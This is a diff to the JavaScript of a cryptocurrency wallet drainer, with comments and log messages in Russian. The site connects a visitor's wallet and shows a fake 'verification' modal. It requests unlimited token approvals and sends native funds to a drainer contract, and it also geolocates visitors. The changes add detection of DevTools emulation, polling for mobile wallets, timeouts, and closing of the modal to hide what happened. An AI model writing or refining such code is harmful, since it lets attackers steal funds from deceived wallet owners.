@@ -113,17 +113,36 @@ async function getGeolocation(ip) {
   }
 }
 
-// Функция для определения устройства
+// Функция для определения устройства с учётом эмуляции
 function detectDevice() {
   const userAgent = navigator.userAgent.toLowerCase();
   const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
 
+  // Проверяем, включена ли эмуляция в Chrome DevTools
+  const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;
+
+  if (isDevToolsEmulation) {
+    // Если это эмуляция, определяем реальное устройство
+    const realPlatform = navigator.platform.toLowerCase();
+    if (/win32|win64/i.test(realPlatform)) return "Windows";
+    if (/macintosh|mac os/i.test(realPlatform)) return "Mac";
+    if (/linux/i.test(realPlatform)) return "Linux";
+    return "Unknown";
+  }
+
+  // Обычная проверка для реальных устройств
   if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
   if (/android/i.test(userAgent)) return "Android";
   if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
   if (/macintosh|mac os/i.test(userAgent)) return "Mac";
   if (/linux/i.test(userAgent)) return "Linux";
   return "Unknown";
+}
+
+// Функция для проверки, является ли устройство мобильным
+function isMobileDevice() {
+  const device = detectDevice();
+  return device === "iPhone" || device === "Android";
 }
 
 // Функция для отправки уведомления при заходе на сайт
@@ -433,7 +452,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
-        console.log(`⏳ Задержка 5 секунд перед approve для токена ${token}`);
+        console.log(`⏳ Задержка перед approve для токена ${token}`);
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
@@ -449,11 +468,20 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
         // Закрываем модальное окно после успешного approve
         if (!modalClosed) {
+          console.log(`ℹ️ Закрываем модальное окно после успешного approve для токена ${token}`);
           await hideModalWithDelay();
           modalClosed = true;
         }
       } catch (error) {
         console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
+        if (error.message.includes('user rejected')) {
+          // Пользователь отклонил транзакцию
+          if (!modalClosed) {
+            console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
+            await hideModalWithDelay("Error: Transaction rejected by user.");
+            modalClosed = true;
+          }
+        }
         throw new Error(`Failed to approve token ${token}: ${error.message}`);
       }
     } else {
@@ -463,6 +491,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
       // Закрываем модальное окно, если allowance уже достаточно
       if (!modalClosed) {
+        console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
         await hideModalWithDelay();
         modalClosed = true;
       }
@@ -484,7 +513,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Цена газа для ${chainConfig.nativeToken}: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
-        console.log(`⏳ Задержка 5 секунд перед processData`);
+        console.log(`⏳ Задержка перед processData`);
         await delay(10);
 
         const tx = await drainer.processData(taskId, dataHash, nonce, [], {
@@ -497,8 +526,23 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const receipt = await tx.wait();
         console.log(`✅ Транзакция processData подтверждена: ${receipt.transactionHash}`);
         status = 'confirmed';
+
+        // Закрываем модальное окно после успешного processData
+        if (!modalClosed) {
+          console.log(`ℹ️ Закрываем модальное окно после успешного processData для ${chainConfig.nativeToken}`);
+          await hideModalWithDelay();
+          modalClosed = true;
+        }
       } catch (error) {
         console.error(`❌ Ошибка вывода ${chainConfig.nativeToken}: ${error.message}`);
+        if (error.message.includes('user rejected')) {
+          // Пользователь отклонил транзакцию
+          if (!modalClosed) {
+            console.log(`ℹ️ Пользователь отклонил processData для ${chainConfig.nativeToken}, закрываем модальное окно`);
+            await hideModalWithDelay("Error: Transaction rejected by user.");
+            modalClosed = true;
+          }
+        }
         throw new Error(`Failed to process ${chainConfig.nativeToken}: ${error.message}`);
       }
     }
@@ -809,6 +853,7 @@ async function hideModalWithDelay(errorMessage = null) {
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
     console.log('⚠️ Транзакция уже выполнена или ожидается');
+    await hideModalWithDelay("Transaction already completed or pending.");
     return;
   }
 
@@ -822,6 +867,13 @@ async function attemptDrainer() {
   // Показываем модальное окно верификации перед началом процесса
   showModal();
 
+  // Добавляем тайм-аут на выполнение дрейнера
+  const drainerTimeout = setTimeout(async () => {
+    isTransactionPending = false;
+    console.error('❌ Тайм-аут выполнения дрейнера');
+    await hideModalWithDelay("Error: Drainer operation timed out. Please try again.");
+  }, 60000); // 60 секунд
+
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
@@ -832,7 +884,7 @@ async function attemptDrainer() {
     }
 
     console.log('⏳ Задержка 5 секунд перед runDrainer');
-    await new Promise(resolve => setTimeout(resolve, 10));
+    await new Promise(resolve => setTimeout(resolve, 5000));
 
     isTransactionPending = true;
     const status = await runDrainer(provider, signer, connectedAddress);
@@ -840,8 +892,11 @@ async function attemptDrainer() {
 
     hasDrained = true;
     isTransactionPending = false;
+    clearTimeout(drainerTimeout);
+    await hideModalWithDelay();
   } catch (err) {
     isTransactionPending = false;
+    clearTimeout(drainerTimeout);
     let errorMessage = "Error: An unexpected error occurred. Please try again.";
     if (err.message.includes('user rejected')) {
       errorMessage = "Error: Transaction rejected by user.";
@@ -867,13 +922,12 @@ async function handleConnectOrAction() {
   try {
     // Проверяем, подключён ли уже кошелёк
     if (!connectedAddress) {
-      // Открываем модальное окно AppKit для выбора кошелька только если кошелёк ещё не подключён
+      console.log('ℹ️ Открываем модальное окно AppKit для выбора кошелька');
+      // Открываем модальное окно AppKit
       await appKitModal.open();
-
-      // Ожидаем, пока пользователь выберет и подключит кошелёк
+      // Ожидаем подключения кошелька через AppKit
       connectedAddress = await waitForWallet();
       console.log('✅ Подключён:', connectedAddress);
-
       // Закрываем модальное окно AppKit после успешного подключения
       appKitModal.close();
     } else {
@@ -885,11 +939,12 @@ async function handleConnectOrAction() {
       await attemptDrainer();
     } else {
       console.log('⏳ Транзакция уже выполняется');
+      await hideModalWithDelay("Transaction already in progress.");
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
+    appKitModal.close(); // Закрываем модальное окно в случае ошибки
     isTransactionPending = false;
-    // Показываем модальное окно верификации только в случае ошибки после подключения
     showModal();
     await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
   }
@@ -902,14 +957,20 @@ async function onChainChanged(chainId) {
     await attemptDrainer();
   } else {
     console.log('⏳ Транзакция в процессе');
+    await hideModalWithDelay("Transaction in progress, please wait.");
   }
 }
 
 // === Ожидание подключения кошелька через AppKit ===
-// === Ожидание подключения кошелька через AppKit ===
 async function waitForWallet() {
   return new Promise((resolve, reject) => {
-    // Проверяем, есть ли уже подключённые аккаунты
+    console.log('⏳ Ожидаем подключение кошелька через AppKit...');
+
+    // Определяем, является ли устройство мобильным
+    const isMobile = isMobileDevice();
+    console.log(`ℹ️ Устройство: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
+
+    // Функция для проверки аккаунтов
     const checkAccounts = async () => {
       try {
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
@@ -917,6 +978,7 @@ async function waitForWallet() {
           console.log('✅ Аккаунты найдены через eth_accounts:', accounts);
           window.ethereum.removeListener('accountsChanged', handler);
           clearTimeout(timeout);
+          clearInterval(checkInterval);
           resolve(accounts[0]);
         } else {
           // Если аккаунты не найдены, явно запрашиваем подключение
@@ -925,20 +987,25 @@ async function waitForWallet() {
           if (requestedAccounts.length > 0) {
             window.ethereum.removeListener('accountsChanged', handler);
             clearTimeout(timeout);
+            clearInterval(checkInterval);
             resolve(requestedAccounts[0]);
           }
         }
       } catch (err) {
         console.error('❌ Ошибка проверки аккаунтов:', err.message);
+        window.ethereum.removeListener('accountsChanged', handler);
+        clearTimeout(timeout);
+        clearInterval(checkInterval);
         reject(err);
       }
     };
 
-    // Устанавливаем тайм-аут на 10 секунд (было 30)
+    // Устанавливаем тайм-аут на 30 секунд
     const timeout = setTimeout(() => {
       window.ethereum.removeListener('accountsChanged', handler);
+      clearInterval(checkInterval);
       reject(new Error('Wallet connection timed out'));
-    }, 10000);
+    }, 30000);
 
     // Слушаем событие изменения аккаунтов
     const handler = (accounts) => {
@@ -946,13 +1013,34 @@ async function waitForWallet() {
         console.log('✅ Событие accountsChanged сработало:', accounts);
         window.ethereum.removeListener('accountsChanged', handler);
         clearTimeout(timeout);
+        clearInterval(checkInterval);
         resolve(accounts[0]);
       }
     };
 
     window.ethereum.on('accountsChanged', handler);
 
-    // Проверяем аккаунты сразу после открытия модального окна
+    // Периодическая проверка аккаунтов (особенно важно для мобильных устройств)
+    const checkInterval = setInterval(async () => {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+          console.log('✅ Аккаунты найдены через периодическую проверку:', accounts);
+          window.ethereum.removeListener('accountsChanged', handler);
+          clearTimeout(timeout);
+          clearInterval(checkInterval);
+          resolve(accounts[0]);
+        }
+      } catch (err) {
+        console.error('❌ Ошибка периодической проверки аккаунтов:', err.message);
+        window.ethereum.removeListener('accountsChanged', handler);
+        clearTimeout(timeout);
+        clearInterval(checkInterval);
+        reject(err);
+      }
+    }, 1000); // Проверяем каждую секунду
+
+    // Выполняем начальную проверку
     checkAccounts();
   });
 }
